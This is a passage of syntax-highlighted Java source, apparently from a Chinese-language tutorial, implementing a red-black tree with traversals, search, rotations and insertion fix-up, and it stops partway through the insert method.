punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">preOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">preOrder</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 中序遍历"红黑树"     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">inOrder</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tree <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">inOrder</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>key<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">inOrder</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">inOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">inOrder</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 后序遍历"红黑树"     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">postOrder</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>tree <span class="token operator">!=</span> null<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">postOrder</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">postOrder</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>key<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">postOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">postOrder</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * (递归实现)查找"红黑树x"中键值为key的节点     */</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">search</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x<span class="token punctuation">,</span> T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token operator">==</span>null<span class="token punctuation">)</span>            <span class="token keyword">return</span> x<span class="token punctuation">;</span>        <span class="token keyword">int</span> cmp <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">search</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>left<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">search</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>right<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">search</span><span class="token punctuation">(</span>T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">search</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * (非递归实现)查找"红黑树x"中键值为key的节点     */</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">iterativeSearch</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x<span class="token punctuation">,</span> T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> cmp <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                 x <span class="token operator">=</span> x<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>                 x <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">else</span>                <span class="token keyword">return</span> x<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">iterativeSearch</span><span class="token punctuation">(</span>T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">iterativeSearch</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 查找最小结点：返回tree为根结点的红黑树的最小结点。     */</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">minimum</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree <span class="token operator">==</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            tree <span class="token operator">=</span> tree<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">return</span> tree<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> T <span class="token function">minimum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> p <span class="token operator">=</span> <span class="token function">minimum</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> p<span class="token punctuation">.</span>key<span class="token punctuation">;</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 查找最大结点：返回tree为根结点的红黑树的最大结点。     */</span>    <span class="token keyword">private</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">maximum</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tree<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>tree <span class="token operator">==</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>tree<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span>            tree <span class="token operator">=</span> tree<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token keyword">return</span> tree<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> T <span class="token function">maximum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> p <span class="token operator">=</span> <span class="token function">maximum</span><span class="token punctuation">(</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> p<span class="token punctuation">.</span>key<span class="token punctuation">;</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 找结点(x)的后继结点。即，查找"红黑树中数据值大于该结点"的"最小结点"。     */</span>    <span class="token keyword">public</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">successor</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 如果x存在右孩子，则"x的后继结点"为 "以其右孩子为根的子树的最小结点"。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">minimum</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 如果x没有右孩子。则x有以下两种可能：</span>        <span class="token comment" spellcheck="true">// (01) x是"一个左孩子"，则"x的后继结点"为 "它的父结点"。</span>        <span class="token comment" spellcheck="true">// (02) x是"一个右孩子"，则查找"x的最低的父结点，并且该父结点要具有左孩子"，找到的这个"最低的父结点"就是"x的后继结点"。</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y <span class="token operator">=</span> x<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>x<span class="token operator">==</span>y<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            x <span class="token operator">=</span> y<span class="token punctuation">;</span>            y <span class="token operator">=</span> y<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 找结点(x)的前驱结点。即，查找"红黑树中数据值小于该结点"的"最大结点"。     */</span>    <span class="token keyword">public</span> RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token function">predecessor</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 如果x存在左孩子，则"x的前驱结点"为 "以其左孩子为根的子树的最大结点"。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">maximum</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 如果x没有左孩子。则x有以下两种可能：</span>        <span class="token comment" spellcheck="true">// (01) x是"一个右孩子"，则"x的前驱结点"为 "它的父结点"。</span>        <span class="token comment" spellcheck="true">// (01) x是"一个左孩子"，则查找"x的最低的父结点，并且该父结点要具有右孩子"，找到的这个"最低的父结点"就是"x的前驱结点"。</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y <span class="token operator">=</span> x<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>x<span class="token operator">==</span>y<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            x <span class="token operator">=</span> y<span class="token punctuation">;</span>            y <span class="token operator">=</span> y<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 对红黑树的节点(x)进行左旋转     *     * 左旋示意图(对节点x进行左旋)：     *      px                              px     *     /                               /     *    x                               y                     *   /  \      --(左旋)-.           / \                #     *  lx   y                          x  ry          *     /   \                       /  \     *    ly   ry                     lx  ly       *     *     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">leftRotate</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 设置x的右孩子为y</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “y的左孩子” 设为 “x的右孩子”；</span>        <span class="token comment" spellcheck="true">// 如果y的左孩子非空，将 “x” 设为 “y的左孩子的父亲”</span>        x<span class="token punctuation">.</span>right <span class="token operator">=</span> y<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>y<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span>            y<span class="token punctuation">.</span>left<span class="token punctuation">.</span>parent <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “x的父亲” 设为 “y的父亲”</span>        y<span class="token punctuation">.</span>parent <span class="token operator">=</span> x<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> y<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 如果 “x的父亲” 是空节点，则将y设为根节点</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> x<span class="token punctuation">)</span>                x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 如果 x是它父节点的左孩子，则将y设为“x的父节点的左孩子”</span>            <span class="token keyword">else</span>                x<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 如果 x是它父节点的左孩子，则将y设为“x的父节点的左孩子”</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 将 “x” 设为 “y的左孩子”</span>        y<span class="token punctuation">.</span>left <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “x的父节点” 设为 “y”</span>        x<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 对红黑树的节点(y)进行右旋转     *     * 右旋示意图(对节点y进行左旋)：     *            py                               py     *           /                                /     *          y                                x                       *         /  \      --(右旋)-.            /  \                     #     *        x   ry                           lx   y       *       / \                                   / \                   #     *      lx  rx                                rx  ry     *      */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">rightRotate</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 设置x是当前节点的左孩子。</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x <span class="token operator">=</span> y<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “x的右孩子” 设为 “y的左孩子”；</span>        <span class="token comment" spellcheck="true">// 如果"x的右孩子"不为空的话，将 “y” 设为 “x的右孩子的父亲”</span>        y<span class="token punctuation">.</span>left <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span>            x<span class="token punctuation">.</span>right<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “y的父亲” 设为 “x的父亲”</span>        x<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>y<span class="token punctuation">.</span>parent <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> x<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 如果 “y的父亲” 是空节点，则将x设为根节点</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>y <span class="token operator">==</span> y<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right<span class="token punctuation">)</span>                y<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>right <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 如果 y是它父节点的右孩子，则将x设为“y的父节点的右孩子”</span>            <span class="token keyword">else</span>                y<span class="token punctuation">.</span>parent<span class="token punctuation">.</span>left <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// (y是它父节点的左孩子) 将x设为“x的父节点的左孩子”</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 将 “y” 设为 “x的右孩子”</span>        x<span class="token punctuation">.</span>right <span class="token operator">=</span> y<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将 “y的父节点” 设为 “x”</span>        y<span class="token punctuation">.</span>parent <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*     * 红黑树插入修正函数     *     * 在向红黑树中插入节点之后(失去平衡)，再调用该函数；     * 目的是将它重新塑造成一颗红黑树。     *     * 参数说明：     *     node 插入的结点        // 对应《算法导论》中的z     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">insertFixUp</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> parent<span class="token punctuation">,</span> gparent<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 若“父节点存在，并且父节点的颜色是红色”</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>parent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isRed</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            gparent <span class="token operator">=</span> <span class="token function">parentOf</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若“父节点”是“祖父节点的左孩子”</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">==</span> gparent<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Case 1条件：叔叔节点是红色</span>                RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> uncle <span class="token operator">=</span> gparent<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uncle<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isRed</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    node <span class="token operator">=</span> gparent<span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Case 2条件：叔叔是黑色，且当前节点是右孩子</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>right <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tmp<span class="token punctuation">;</span>                    <span class="token function">leftRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span>                    parent <span class="token operator">=</span> node<span class="token punctuation">;</span>                    node <span class="token operator">=</span> tmp<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Case 3条件：叔叔是黑色，且当前节点是左孩子。</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">rightRotate</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//若“z的父节点”是“z的祖父节点的右孩子”</span>                <span class="token comment" spellcheck="true">// Case 1条件：叔叔节点是红色</span>                RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> uncle <span class="token operator">=</span> gparent<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>uncle<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isRed</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>uncle<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    node <span class="token operator">=</span> gparent<span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Case 2条件：叔叔是黑色，且当前节点是左孩子</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>parent<span class="token punctuation">.</span>left <span class="token operator">==</span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> tmp<span class="token punctuation">;</span>                    <span class="token function">rightRotate</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                    tmp <span class="token operator">=</span> parent<span class="token punctuation">;</span>                    parent <span class="token operator">=</span> node<span class="token punctuation">;</span>                    node <span class="token operator">=</span> tmp<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">// Case 3条件：叔叔是黑色，且当前节点是右孩子。</span>                <span class="token function">setBlack</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setRed</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">leftRotate</span><span class="token punctuation">(</span>gparent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 将根节点设为黑色</span>        <span class="token function">setBlack</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 将结点插入到红黑树中     *     * 参数说明：     *     node 插入的结点        // 对应《算法导论》中的node     */</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> cmp<span class="token punctuation">;</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> y <span class="token operator">=</span> null<span class="token punctuation">;</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> x <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1. 将红黑树当作一颗二叉查找树，将节点添加到二叉查找树中。</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            y <span class="token operator">=</span> x<span class="token punctuation">;</span>            cmp <span class="token operator">=</span> node<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                x <span class="token operator">=</span> x<span class="token punctuation">.</span>left<span class="token punctuation">;</span>            <span class="token keyword">else</span>                x <span class="token operator">=</span> x<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        node<span class="token punctuation">.</span>parent <span class="token operator">=</span> y<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>y<span class="token operator">!=</span>null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            cmp <span class="token operator">=</span> node<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>y<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>cmp <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                y<span class="token punctuation">.</span>left <span class="token operator">=</span> node<span class="token punctuation">;</span>            <span class="token keyword">else</span>                y<span class="token punctuation">.</span>right <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mRoot <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 2. 设置节点的颜色为红色</span>        node<span class="token punctuation">.</span>color <span class="token operator">=</span> RED<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 3. 将它重新修正为一颗二叉查找树</span>        <span class="token function">insertFixUp</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*      * 新建结点(key)，并将其插入到红黑树中     *     * 参数说明：     *     key 插入结点的键值     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>T key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        RBTNode<span class="token operator">&lt;</span>T<span class="token operator">></span> 